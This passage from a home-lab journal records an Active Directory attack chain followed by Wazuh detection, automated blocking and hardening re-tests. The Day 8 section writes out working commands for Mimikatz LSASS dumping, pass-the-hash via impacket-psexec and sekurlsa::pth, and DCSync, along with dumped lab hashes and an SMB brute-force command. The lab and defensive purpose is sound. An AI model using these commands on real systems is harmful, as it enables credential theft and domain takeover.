- Added pfSense rules on ATTACKERS (`OPT2`) for TCP 135 (MSRPC) and 445 (SMB), and enabled Windows Firewall inbound rules (`File and Printer Sharing`, `WMI`) on `DESKTOP-C8VMV6Q` (`DomainAuthenticated` network profile).
- `nmap -p 135,445 -Pn 10.0.20.10` still reported `filtered` despite verified pfSense rules. Temporarily disabled the Windows Domain Firewall (`Set-NetFirewallProfile -Profile Domain -Enabled False`) to isolate the variable: ports remained `filtered`, proving Windows was not dropping the packets.
- Ran `sudo tcpdump -i eth1 host 10.0.20.10` on Kali during an Nmap scan: **0 packets captured** — Kali was not routing traffic toward `10.0.20.10` at all.
- Verified `ip route`: Kali had a static route to `10.0.10.0/24` (SERVERS) via `10.0.30.1`, but **none for `10.0.20.0/24` (USERS)**. Added `sudo ip route add 10.0.20.0/24 via 10.0.30.1 dev eth1`.
- Confirmed `135/tcp` (`msrpc`) and `445/tcp` (`microsoft-ds`) `open` on `10.0.20.10`, then re-enabled the Windows Domain Firewall (`Set-NetFirewallProfile -Profile Domain -Enabled True`).

**Session Collection & Windows Hardening Boundary**
- Executed `bloodhound-python -u compte2 -p 'Password1' -d label.local -ns 10.0.10.40 -c All` and uploaded the results to BloodHound CE.
- Ran the pre-built query *"Domain Admins logons to non-Domain Controllers"* — returned `No results match your criteria`.
- Isolated collection with `-c Session -v`: observed `DCE/RPC binding: Access denied while enumerating Sessions on DC01.label.local, likely a patched OS`. Modern Windows restricts remote `NetSessionEnum` queries to elevated accounts rather than standard domain users — a real-world OS hardening behavior rather than a lab misconfiguration.

**Simulating Compromised Local Admin & LSASS Credential Dumping**
- Adjusted the lateral movement scenario realistically: an attacker targeting LSASS already holds local administrative rights on the workstation rather than discovering admin sessions anonymously over SMB.
- From `acl-test`'s session on the Windows 10 client, added standard user `compte2` to the local Administrators group:
  ```cmd
  net localgroup Administrators label.local\compte2 /add
  ```
- Staged `mimikatz_trunk.zip` on the Windows 10 client and launched an elevated session as `compte2` (`privilege::debug` → `Privilege '20' OK`).
- **First extraction attempt (`sekurlsa::logonpasswords`)**: No credentials for `acl-test` appeared in LSASS (only `compte2` and machine account `DESKTOP-C8VMV6Q$`). Root cause: `acl-test` had performed a standard sign-out ("Logout"), which flushes session credentials from LSASS.
- **Fix & Second extraction**: Signed `acl-test` back in and switched to `compte2` via **"Switch User"** (keeping `acl-test`'s session active in memory). Running `sekurlsa::logonpasswords` successfully extracted `acl-test`'s active logon credentials (`DC01`, SID `S-1-5-21-4102991481-2571678191-3181831677-1110`):
  - **NTLM Hash**: `64f12cddaa88057e06a81b54e73b949b`
  - **SHA1**: `cba4e545b7ec918129725154b29f055e4cd5aea8`
  - `wdigest` and `kerberos` cleartext fields showed `(null)` because modern Windows disables WDigest cleartext caching by default (unlike machine accounts, where Kerberos retains an auto-generated cleartext secret for ticket renewal).

**Password Reuse Discovery**
- Comparing dumped LSASS hashes revealed that `acl-test` (Domain Admin) and `compte2` (standard user) share the **exact same NTLM hash** (`64f12cddaa88057e06a81b54e73b949b` → `Password1`). Password reuse across privilege tiers is an independent critical vulnerability allowing an attacker who compromises or cracks a standard account to pivot directly into privileged roles.

**End-to-End Domain Compromise via Pass-the-Hash (`impacket-psexec`)**
- From Kali (`10.0.30.10`), used the dumped NTLM hash of `acl-test` directly against `DC01` (`10.0.10.40`) without ever needing or cracking the cleartext password:
  ```bash
  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b label.local/acl-test@10.0.10.40
  ```
- Authenticated over SMB (`ADMIN$` share writable), uploaded the service binary, created/started service `jxwy`, and obtained an interactive shell on `DC01`.
- Ran `whoami` → **`nt authority\system`**, completing the full attack chain from a single user workstation to `SYSTEM` on the Domain Controller.

**Initial DCSync Attempts (Failed — Wrong Security Context)**
- Ran `lsadump::dcsync /domain:label.local /user:Administrator@label.local` from the existing Mimikatz session on the Windows 10 client — received `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)`. DCSync requires domain-controller-level replication rights; the current Mimikatz session was running as `compte2`, a standard local admin, not as a domain admin context.
- Retried with `/user:acl-test@label.local` — same error, confirming the issue was the security context of the process, not the target account syntax.
- Attempted DCSync from inside the `impacket-psexec` SYSTEM shell on DC01 by typing `lsadump::dcsync` directly — PowerShell does not interpret Mimikatz commands natively (returned `CommandNotFoundException`).

**Pass-the-Hash Session Injection via `sekurlsa::pth`**
- From the Mimikatz session running as `compte2` (local admin on Windows 10 client), injected `acl-test`'s NTLM hash to spawn a new PowerShell process inheriting `acl-test`'s domain identity, without needing the cleartext password:
  ```
  sekurlsa::pth /user:acl-test /domain:label.local /ntlm:64f12cddaa88057e06a81b54e73b949b /run:powershell.exe
  ```
- **First attempt failed**: `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` — Mimikatz did not have LSASS read access because `privilege::debug` had not been run first.
- **Second attempt** (after `privilege::debug` → `Privilege '20' OK`): `sekurlsa::pth` succeeded. Output confirmed LUID injection, LSA process set to R/W, and spawned `powershell.exe` (PID 8404) with `acl-test`'s security token. A new elevated PowerShell window opened at `C:\Windows\System32`.

**DCSync from Injected `acl-test` Context**
- In the new PowerShell window (identity: `acl-test` / Domain Admin), attempted `lsadump::dcsync /domain:label.local /user:Administrator` — PowerShell does not know this command (it is a Mimikatz internal command).
- Attempted `.\mimikatz.exe` from the default CWD (`C:\Windows\System32`) — not found, because Mimikatz lives in `C:\Users\compte2\Desktop\mimikatz_trunk\x64\`.
- Navigated to the correct directory and launched `.\mimikatz.exe`:
  ```powershell
  cd C:\Users\compte2\Desktop\mimikatz_trunk\x64
  .\mimikatz.exe
  ```
- Executed DCSync targeting the built-in `Administrator` account (RID 500):
  ```
  lsadump::dcsync /domain:label.local /user:Administrator
  ```
- **DCSync succeeded**. Mimikatz replicated the `Administrator` account's secrets directly from DC01 via LDAP/DRSR (Directory Replication Service Remote Protocol):
  - **NTLM Hash**: `a2345375a47a92754e2505132aca194b`
  - **AES-256**: `b133cf22f5a4a7eebfc672afab6e03450fa22043fc53990647b2aa44829fdafc`
  - **AES-128**: `285d702ac2f1a6112f8d28bd07c243a8`
  - **RID**: 500 (built-in Administrator)
  - **SID**: `S-1-5-21-4102991481-2571678191-3181831677-500`

**Final Domain Takeover — Pass-the-Hash as Administrator**
- From Kali (`10.0.30.10`), used the harvested `Administrator` NTLM hash against DC01 (`10.0.10.40`):
  ```bash
  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a2345375a47a92754e2505132aca194b label.local/Administrator@10.0.10.40
  ```
- Impacket found writable share `ADMIN$`, uploaded service binary `TurmKUkx.exe`, opened SVCManager, created and started service `zUXs`, and delivered an interactive shell on DC01 as `NT AUTHORITY\SYSTEM`.
- **Full domain compromise confirmed** using the built-in `Administrator` account — no password ever cracked, no interactive GUI logon required.

### Problems & fixes
- `135/445` persistently `filtered` on `10.0.20.10` despite verified pfSense rules and disabled Windows Firewall → missing static route for `10.0.20.0/24` on Kali, diagnosed with `tcpdump` (`0 packets captured`) and resolved via `ip route add 10.0.20.0/24 via 10.0.30.1 dev eth1`.
- BloodHound `-c All` / `-c Session` returned no `HasSession` edges → `NetSessionEnum` restricted by modern Windows hardening (`Access denied... likely a patched OS`); pivoted to simulating pre-existing local admin compromise on the client.
- First Mimikatz dump showed no Domain Admin credentials → `acl-test` had signed out (clearing LSASS); fixed by keeping the session alive via "Switch User".
- `psexec.py` returned `command not found` on Kali → used the packaged `impacket-psexec` binary.
- `lsadump::dcsync` → `ERROR 0x000020f7` from `compte2` context: DCSync is a domain-replication privilege; it requires running as a domain admin. Solution: inject `acl-test`'s NTLM hash via `sekurlsa::pth` to spawn a process under its identity.
- `sekurlsa::pth` → `Handle on memory (0x00000005)`: LSASS handle requires `privilege::debug` first. Added `privilege::debug` → `Privilege '20' OK` before the pth command.
- Injected PowerShell couldn't find `mimikatz.exe` via `.\mimikatz.exe` from `C:\Windows\System32`: the working directory after `sekurlsa::pth` defaults to `System32`. Fixed by navigating to the mimikatz folder with the full path before launching.
- Mimikatz commands (`lsadump::dcsync`) typed directly into PowerShell returned `CommandNotFoundException`: Mimikatz commands are internal to its own interpreter, not PowerShell cmdlets. Must launch `mimikatz.exe` explicitly and run commands within its shell.

### What I learned
- `-c DCOnly` gathers LDAP directory topology only, whereas `-c All` additionally queries hosts live over SMB/RPC for active sessions (`HasSession`) and local admin memberships.
- Windows restricts remote `NetSessionEnum` to elevated accounts on patched systems — an important real-world defensive hurdle that makes local host compromise a prerequisite before discovering or harvesting higher-tier sessions.
- LSASS retains active logon material (NTLM hashes, SHA1, and legacy providers where enabled); logging out wipes those secrets from memory, while "Switch User" leaves them resident and harvestable.
- Password reuse across privilege boundaries (standard user sharing credentials with a Domain Admin) shortcuts lateral movement completely.
- Pass-the-Hash (`impacket-psexec -hashes ...`) demonstrates why NTLM hashes are **password equivalents** in Active Directory — cracking cleartext is completely unnecessary once an NTLM hash for a Tier 0 account is recovered from a Tier 2 workstation.
- **DCSync** does not require physical access to the DC or any exploit — it abuses the legitimate AD replication protocol (DRSR/MS-DRSR) to request any account's secrets via LDAP. Any account with `Replicating Directory Changes` + `Replicating Directory Changes All` permissions (usually only Domain Admins, Domain Controllers, and Azure AD Connectors) can perform it.
- **`sekurlsa::pth`** (Pass-the-Hash via token injection) spawns a child process inheriting an NTLM-authenticated identity without knowing the cleartext password. The process appears to Windows as that user for all network authentication purposes.
- The two-step chain `sekurlsa::pth` → DCSync is a critical escalation path: once a Domain Admin hash is extracted from LSASS, it can be used to replicate any account including the built-in `Administrator` (RID 500), making the compromise permanent and independent of password changes on other domain user accounts.
- DCSync with the `Administrator` (RID 500) NTLM hash provides a backdoor that persists even if other compromised accounts (`acl-test`) have their passwords changed, because RID 500 cannot be disabled.
- `privilege::debug` is always required before any `sekurlsa::*` Mimikatz commands that interact with LSASS memory — the error `0x00000005` (Access Denied) is the tell-tale sign it was skipped.

### Next
- Begin the **Blue Team phase (Wazuh SIEM)**: deploy Wazuh Manager on a dedicated VM and agents on DC01 and the Windows 10 client. Configure detection rules for:
  - **Event ID 4662** (`Replicating Directory Changes All` GUID accessed by non-DC account) → DCSync detection
  - **Event ID 4624 / 4648** (Logon Type 3 / network NTLM from attacker subnet)
  - **Event ID 7045 / 4697** (service creation by `impacket-psexec`)
  - **Sysmon Event ID 10** (LSASS process access by non-system processes)
  - **Event ID 4728 / 4732** (privileged group membership changes)

---

## Day 9 — 2026-11-26 / 2026-11-27: Blue Team Phase — Wazuh SIEM Deployment, Detection Engineering, Active Response, FIM & Vulnerability Detection

### Goals
- Build and validate the end-to-end **Blue Team (Defensive)** phase of the home lab using **Wazuh SIEM**: deploy the central SIEM platform, validate concrete detections against real attack techniques, and implement automated containment.
- Cover four core defensive pillars: suspicious behavior detection (privilege abuse & authentication brute-force), automated containment (**Active Response**), real-time **File Integrity Monitoring (FIM)**, and passive **Vulnerability Detection (CVE correlation)**.

### What I did

**Wazuh SIEM All-in-One Deployment & Agent Enrollment**
- Deployed a dedicated Ubuntu Server VM (`10.0.10.50`, SERVERS zone) running **Wazuh v4.14.11 all-in-one** (`wazuh-indexer`, `wazuh-manager`, `wazuh-dashboard`, `filebeat`), accessible over HTTPS (`https://10.0.10.50:443`).
- Added a pfSense rule on `USERS` (`OPT1`) allowing `USERS net → 10.0.10.50` on TCP `1514` (agent event transport) and `1515` (agent enrollment).
- Installed and enrolled the Wazuh Windows agent (`WazuhSvc`, agent `001` / `Windows-agent`) on the domain-joined Windows 10 Pro workstation (`DESKTOP-C8VMV6Q`, `10.0.20.10`).
- **Detection #1 — Security Group Privilege Escalation (Event ID 4732 / 4733)**:
  - Re-tested local group membership modification on `DESKTOP-C8VMV6Q` (adding `compte2` to `Builtin\Administrators` — directly mirroring the privilege abuse chain from Day 8).
  - Verified native Wazuh detection: **Rule `60154`** (*"Windows: Member added to a security-enabled local group"*, **Severity Level 12**, **MITRE ATT&CK `T1484`** — Defense Evasion / Privilege Escalation), capturing `subjectUserName`, `memberSid`, and `targetUserName: Administrators`.

**Detection #2 — Network SMB Brute-Force Correlation (Event ID 4625 → Rule 60204)**
- Audited the Wazuh ruleset (`/var/ossec/ruleset/rules/0580-win-security_rules.xml`) across the `authentication_failed` group to locate native correlation rules `60203`–`60207`. Confirmed **Rule `60204`** (*"Multiple Windows Logon Failures"*, Level 10, MITRE `T1110`) triggers on `$MS_FREQ = 8` failed logons within a `240s` timeframe, counting underlying **Rule `60122`** (Event ID `4625`).
- **First test (6 local interactive attempts via PowerShell)**: Threshold (`8`) was not reached, and `ipAddress` was empty/loopback because interactive logons (`Logon Type 2`) carry no remote source IP.
- **Second test (cross-zone network SMB attack from Kali, `Logon Type 3`)**:
  - Initially blocked by pfSense zone segmentation (`445/tcp filtered`) — confirming default isolation works as intended. Added a documented temporary pfSense test rule (`ATTACKERS → 10.0.20.10` TCP `445`).
  - Port 445 still appeared `filtered` from Kali: PowerShell inspection (`Get-NetConnectionProfile` and `Get-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)" | Get-NetFirewallAddressFilter`) revealed the interface was using the `Private` profile, whose built-in SMB inbound rule restricts `RemoteAddress` to `LocalSubnet` (unlike the `Domain` profile which allows `Any`). Expanded `RemoteAddress` to include `10.0.30.0/24` via `Set-NetFirewallRule` for the test.
  - Executed an SMB dictionary attack from Kali using NetExec (`nxc smb 10.0.20.10 -u compte2 -P /usr/share/wordlists/metasploit/common_roots.txt`, after confirming `hydra` failed against modern SMBv2/v3 dialect negotiation).
  - **Result**: **Rule `60204`** fired cleanly in Wazuh (17 hits), accurately extracting `data.win.eventdata.ipAddress: 10.0.30.10` (`Logon Type 3`).

**Active Response — Automated Attacker IP Blocking (`route-null` vs `netsh`)**
- Configured `<active-response>` on the Wazuh Manager targeting agent `001` when `rules_id` `60204` fires (`timeout: 600` seconds).
- **First attempt (`win_route-null` / `route-null.exe`)**: Although Wazuh logged *"Host Blocked by route-null Active Response"* and `route print` confirmed the null route was added, running `nmap -p 445 -Pn 10.0.20.10` from Kali still showed **`445/tcp open`**. A routing-table null route affects outbound routing decisions and did not reliably prevent the Windows TCP stack from accepting inbound SMB connections in this topology.
- **Fix & Second attempt (`netsh` / `netsh.exe`)**: Switched `<command>` to `netsh` (blocking the attacker IP directly at the Windows Firewall packet-filtering layer) and re-ran the `nxc` brute-force from Kali.
- **Result**: Within seconds of Rule `60204` firing, `nmap -p 445 -Pn 10.0.20.10` from Kali transitioned from `open` to **`445/tcp filtered`**. End-to-end automated containment validated in under 1 minute with zero human intervention.

**Detection #3 — Real-Time File Integrity Monitoring (FIM / `syscheck`)**
- Created a simulated sensitive directory `C:\SensitiveData\config.txt` on the Windows 10 client and added `<directories check_all="yes" realtime="yes">C:\SensitiveData</directories>` to `C:\Program Files (x86)\ossec-agent\ossec.conf`.
- Modified `config.txt` and confirmed near-instantaneous detection (`decoder.name: syscheck_integrity_changed`, `Mode: realtime`), recording full forensic evidence: file size delta (`92` → `94` bytes), modification timestamp, and before/after **MD5, SHA-1, and SHA-256** cryptographic hashes.

**Detection #4 — Passive Vulnerability Detection (`<vulnerability-detection>`)**
- Verified `syscollector` (OS & package inventory) was active on the agent, then enabled `<vulnerability-detection>` on the Wazuh Manager (noting the tag was renamed from `<vulnerability-detector>` to `<vulnerability-detection>` in Wazuh 4.14) with both `nvd` and `msu` (Microsoft Security Updates) feeds enabled.
- Once feed indexing completed, Wazuh correlated the Windows 10 client's inventory (`10.0.19045.2965`) against public advisories and identified **432 unpatched CVEs** (**13 Critical** — including RRAS, MSMQ, PEAP, and PGM Remote Code Execution flaws — **294 High**, and **125 Medium**) without sending a single active scan packet over the network.

### Problems & fixes
- Brute-force correlation rule not immediately obvious near Event `4625` definitions → broadened search across the ruleset for `authentication_failed`, locating `$MS_FREQ`-based correlation rules `60203`–`60207` in `0580-win-security_rules.xml`.
- Local PowerShell logon failures lacked an attacker IP (`Logon Type 2`) → pivoted to a realistic cross-subnet network SMB brute-force (`Logon Type 3`) from Kali.
- SMB port `445` still `filtered` after adding the temporary pfSense test rule → diagnosed Windows Firewall `RemoteAddress: LocalSubnet` restriction on the `Private` profile and scoped it to `10.0.30.0/24` via `Set-NetFirewallRule`.
- `hydra` returned `invalid reply from target` against modern Windows 10 SMBv2/v3 → switched to NetExec (`nxc smb`).
- `route-null` Active Response logged success without actually blocking inbound SMB scans → switched to Windows Firewall blocking via `netsh`, empirically verified by `nmap` (`open` → `filtered`).
- Grepping for `<vulnerability-detector>` in `ossec.conf` returned nothing → tag is named `<vulnerability-detection>` in Wazuh 4.14.
- Exploratory custom Sysmon rule (`100100`) for host-level credential dumper execution was drafted on the manager after installing Sysmon v15.22 (`Microsoft-Windows-Sysmon/Operational`), but end-to-end alerting was left as an open follow-up item while prioritizing native detections and hardening closure.

### What I learned
- Wazuh threshold correlation relies on group membership (`if_matched_group`) and global frequency variables (`$MS_FREQ`): individual events (Rule `60122`) must belong to the target group for threshold rules (Rule `60204`) to count them.
- Logon Type matters operationally for Blue Teams: `Logon Type 2` (interactive) provides no network source IP, whereas `Logon Type 3` (network SMB) populates `ipAddress` for automated firewall containment.
- An automated response that "succeeds in logs" is not necessarily effective on the wire — every SOAR/Active Response action must be empirically re-tested from the attacker's perspective (`route-null` vs `netsh`).
- Real-time FIM (`realtime="yes"`) provides indisputable cryptographic non-repudiation (before/after MD5, SHA-1, SHA-256 hashes) within seconds of unauthorized file tampering.
- Passive CVE correlation via `syscollector` + NVD/MSU feeds surfaces hundreds of host vulnerabilities silently using existing agent telemetry.

### Next
- Close the full Purple Team loop by applying concrete **defensive hardening** measures on Active Directory and the Windows 10 client, then re-running the exact same offensive techniques to prove remediation empirically.

---

## Day 10 — 2026-11-27: Defensive Hardening & Empirical Re-Testing

### Goals
- Close the end-to-end security lifecycle (`Attack → Detect → Harden → Re-Test`) by remediating the highest-priority findings from the Red and Blue Team phases and re-running the **exact same exploitation steps** to prove effectiveness empirically.
- Address three priority areas: OS patch management (432 CVEs), cross-tier password reuse (`acl-test` / `compte2`), and in-memory credential exposure in LSASS.

### What I did

**Hardening #1 — Patch Management Attempt & End-of-Life (EOL) OS Discovery**
- Because the `USERS` subnet has no internet access by design, added a temporary pfSense maintenance rule (`USERS → any` TCP `443`) to allow Windows Update checks on `DESKTOP-C8VMV6Q`.
- Initial attempt via PowerShell (`Install-Module PSWindowsUpdate`) was blocked by PowerShell Execution Policy restrictions and missing NuGet provider bootstrap; pivoted to the native Windows Update GUI (`Settings → Update & Security → Windows Update`).
- **Unexpected result**: Windows Update reported **"You're up to date"** despite Wazuh identifying **432 unpatched CVEs (13 Critical)**.
- **Root-cause investigation (`winver`)**: The workstation runs **Windows 10 Pro Version 22H2 (OS Build `19045.2965`)**, which reached **End of Support (EOL) in October 2025**. Because Microsoft no longer issues monthly cumulative security updates for standard Windows 10 22H2 builds, Windows Update truthfully reports "no updates available" while hundreds of vulnerabilities remain permanently unpatched.
- Documented this as an important architectural finding: routine patch management cannot remediate an EOL operating system — only OS lifecycle migration (Windows 11 or Extended Security Updates) resolves the underlying risk.

**Hardening #2 — Eliminating Cross-Tier Password Reuse (`acl-test` vs `compte2`)**
- On Day 8, dumping LSASS revealed that Domain Admin `acl-test` and standard user `compte2` shared the exact same NTLM hash (`64f12cddaa88057e06a81b54e73b949b`).
- On `DC01`, attempted to rotate `acl-test`'s password using `Set-ADAccountPassword -Identity acl-test -Reset ...`:
  - First attempt failed with `Access is denied` because the PowerShell console was running under `label\windows` (verified via `whoami` and `Get-ADGroupMember -Identity "Domain Admins"`, which showed only `Administrator` and `acl-test`).
  - Re-ran the command from an elevated `Administrator` session on `DC01` and verified the update via `Get-ADUser -Identity acl-test -Properties PasswordLastSet` (`11/27/2026 5:05:14 PM`).
- **Empirical Re-Test**: Signed `acl-test` back into the Windows 10 workstation with its new unique password and dumped LSASS memory again from `compte2`:
  - `acl-test` NTLM hash: **`4accd27585d029d00ea61f3dc3995cc6`**
  - `compte2` NTLM hash: **`64f12cddaa88057e06a81b54e73b949b`** (unchanged)
  - Hash identity across privilege tiers is completely eliminated; compromising `compte2`'s password or hash no longer grants automatic Pass-the-Hash equivalence to a Domain Admin.

**Hardening #3 — LSASS Credential Protection via `Protected Users` Security Group**
- Added Domain Admin `acl-test` to Active Directory's built-in **`Protected Users`** security group on `DC01`:
  ```powershell
  Add-ADGroupMember -Identity "Protected Users" -Members acl-test
  ```
- **Operational nuance verified**: Group membership changes take effect only upon a **complete sign-out and fresh logon** (issuing a new Kerberos TGT/token), not on an already-open session or "Switch User".
- **Empirical Re-Test**: Performed a full sign-out and fresh interactive logon as `acl-test` on `DESKTOP-C8VMV6Q`, switched to `compte2`, and executed the exact same LSASS memory extraction used on Day 8:
  - Every credential provider field (`msv`, `tspkg`, `wdigest`, `kerberos`, `ssp`, `credman`, `cloudap`) returned **completely empty** for `acl-test`'s active sessions — **zero NTLM hash or reusable credential material cached in LSASS**, completely neutralizing the credential dumping & Pass-the-Hash attack chain!

### Problems & fixes
- Isolated `USERS` zone blocked Windows Update checks → added a temporary scoped HTTPS (`443`) maintenance rule on pfSense.
- `PSWindowsUpdate` blocked by Execution Policy & NuGet bootstrap → verified directly via native Windows Update GUI + `winver`.
- `Set-ADAccountPassword` failed with `Access is denied` → session was running under local/non-Domain-Admin user `label\windows`; resolved by executing as `LABEL\Administrator`.
- `Protected Users` showed no immediate effect on an existing session → required a full sign-out/sign-in cycle to refresh the user's security token and purge legacy MSV1_0 NTLM caching.

### What I learned
- Vulnerability management tools (Wazuh `syscollector` + CVE feeds) expose lifecycle blind spots that native OS update utilities hide: an EOL OS displays a reassuring *"You're up to date"* banner while harboring hundreds of critical vulnerabilities.
- **`Protected Users`** is one of the highest-ROI Active Directory hardening controls available: with a single group addition and zero infrastructure cost, it strips NTLM hash caching (`msv`), disables WDigest/CredSSP caching, enforces AES-only Kerberos, shortens TGT lifetime (4 hours), and blocks delegation — breaking the classic workstation-to-DC LSASS/Pass-the-Hash kill chain.
- Security controls should never be assumed effective solely because a configuration command succeeded — **before/after empirical re-testing** using the identical offensive technique is essential to catch operational caveats (such as active sessions retaining pre-hardening tokens until full re-logon, or `route-null` logging success without blocking traffic).

### Project Conclusion & Future Extensions
- The home lab now documents a **complete end-to-end Purple Team lifecycle**:
  1. **Segmented Network Engineering** (pfSense 4-zone isolation)
  2. **Linux & Web Offensive Assessment** (Metasploitable2 services, LPE, full OWASP DVWA suite)
  3. **Active Directory Kill Chain** (AS-REP Roasting, Kerberoasting, `GenericAll` ACL abuse, BloodHound CE mapping, LSASS dumping, Pass-the-Hash, DCSync Tier 0 takeover)
  4. **Blue Team SIEM & Automated Containment** (Wazuh v4.14 deployment, Event 4732/4625 detections, `netsh` Active Response, real-time FIM, passive CVE detection)
  5. **Hardening & Empirical Re-Testing** (EOL lifecycle analysis, cross-tier password rotation, `Protected Users` LSASS neutralization)
- Optional future extensions: enrolling `DC01` directly as a Wazuh agent to detect `Event ID 4662` (DCSync) in real time, and finalizing custom Sysmon Event ID 1 / 10 rules (`local_rules.xml`) for host-level hacktool & LSASS `ProcessAccess` alerting.
---

## Template for new entries

```
## Day N — YYYY-MM-DD

### Goals
- 

### What I did
- 

### Problems & fixes
- 

### What I learned
- 

### Next
- 
```
